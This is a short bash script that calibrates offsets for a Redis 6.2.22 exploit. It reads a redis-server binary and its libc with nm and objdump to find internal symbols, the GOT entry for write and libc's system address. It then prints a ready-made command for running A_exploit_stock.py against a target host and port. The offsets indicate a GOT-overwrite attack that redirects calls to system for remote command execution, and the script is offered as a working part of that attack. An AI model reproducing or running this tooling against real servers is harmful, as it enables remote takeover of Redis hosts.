#!/bin/bash
# calibrate.sh — print the --*-off values for A_exploit_stock.py for a
# NON-official redis-server 6.2.22 build (and its libc).
# Usage: ./calibrate.sh /path/to/redis-server [/path/to/libc.so.6]
set -e
BIN=$1
LIBC=${2:-/lib/x86_64-linux-gnu/libc.so.6}
[ -n "$BIN" ] || { echo "usage: $0 redis-server [libc.so.6]"; exit 1; }

v() { printf '%s' "$2"; }
STR_FORMAT=$(nm "$BIN" | awk '$3=="str_format"{print $1; exit}')
GOT_WRITE=$(objdump -R "$BIN" | awk '$3 ~ /^write($|@)/{print $1; exit}')
SERVER=$(nm "$BIN" | awk '$3=="server"{print $1; exit}')
DBDT=$(nm "$BIN" | awk '$3=="dbDictType"{print $1; exit}')
KC=$(nm "$BIN" | awk '$3=="dictSdsKeyCompare"{print $1; exit}')
LW=$(nm -D "$LIBC" | awk '$3 ~ /^write(@|$)/{print $1; exit}')
LS=$(nm -D "$LIBC" | awk '$3 ~ /^system(@|$)/{print $1; exit}')

for name in STR_FORMAT GOT_WRITE SERVER DBDT KC LW LS; do
  eval "val=\$$name"
  [ -n "$val" ] || { echo "ERROR: $name not found"; exit 1; }
done

cat <<EOF
python3 A_exploit_stock.py <host> <port> [password] [trigger] \\
  --str-format-off 0x$STR_FORMAT \\
  --got-write-off 0x$GOT_WRITE \\
  --libc-write-off 0x$LW \\
  --libc-system-off 0x$LS \\
  --server-off 0x$SERVER \\
  --db-dicttype-off 0x$DBDT \\
  --dictsdskeycompare-off 0x$KC
EOF
